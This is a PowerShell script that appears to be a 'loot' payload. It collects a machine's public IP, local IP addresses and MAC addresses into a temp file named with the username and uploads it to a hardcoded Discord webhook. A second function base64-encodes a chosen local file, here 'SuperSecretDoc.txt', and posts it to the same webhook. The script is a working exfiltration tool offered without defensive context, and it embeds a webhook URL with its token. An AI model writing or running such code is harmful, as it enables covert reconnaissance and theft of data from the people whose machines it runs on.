# Define variables
$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"

# Get public IP address
try {
    $computerPubIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
}
catch {
    $computerPubIP = "Error getting Public IP"
}

# Get local IP addresses
$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 |
           Select-Object InterfaceAlias, IPAddress, PrefixOrigin | 
           Format-Table -AutoSize |
           Out-String

# Get MAC addresses
$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" |
       Select-Object Name, MacAddress, Status |
       Format-Table -AutoSize |
       Out-String

# Construct output string
$output = @"

Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC
"@

# Save output to file
$output > $FileName

# Function to upload to Discord webhook
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    # Replace with your actual Discord webhook URL
    $hookurl = "https://discord.com/api/webhooks/1261009752851484692/B1wpTxDAqPn0aLB8pwU4FH4j1i5iAWFC86__R0DBuiMn96cbFZcx8SWPFTLEOBf-DXb8"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($file)) {
        # Use curl.exe or equivalent command to upload file
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Example usage to upload the generated file to Discord
Upload-Discord -file $FileName






function Upload-DiscordFile {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$WebhookUrl,
        
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $false)]
        [string]$Message = "File upload"  # Default message if none provided
    )

    try {
        # Prepare the file content
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileBase64 = [System.Convert]::ToBase64String($fileBytes)

        # Construct the JSON payload
        $payload = @{
            content = $Message
            file = @{
                value = $fileBase64
                filename = Split-Path $FilePath -Leaf
            }
        }

        # Convert payload to JSON
        $jsonPayload = $payload | ConvertTo-Json

        # Send the request to Discord webhook
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType 'multipart/form-data' -Body $jsonPayload
    }
    catch {
        Write-Error "Failed to upload file to Discord webhook: $_"
    }
}
$webhookUrl = "https://discord.com/api/webhooks/1261009752851484692/B1wpTxDAqPn0aLB8pwU4FH4j1i5iAWFC86__R0DBuiMn96cbFZcx8SWPFTLEOBf-DXb8"
$filePath = "C:\Users\ameer\Downloads\SuperSecretDoc.txt"
$message = "Here is the file upload!"

Upload-DiscordFile -WebhookUrl $webhookUrl -FilePath $filePath -Message $message


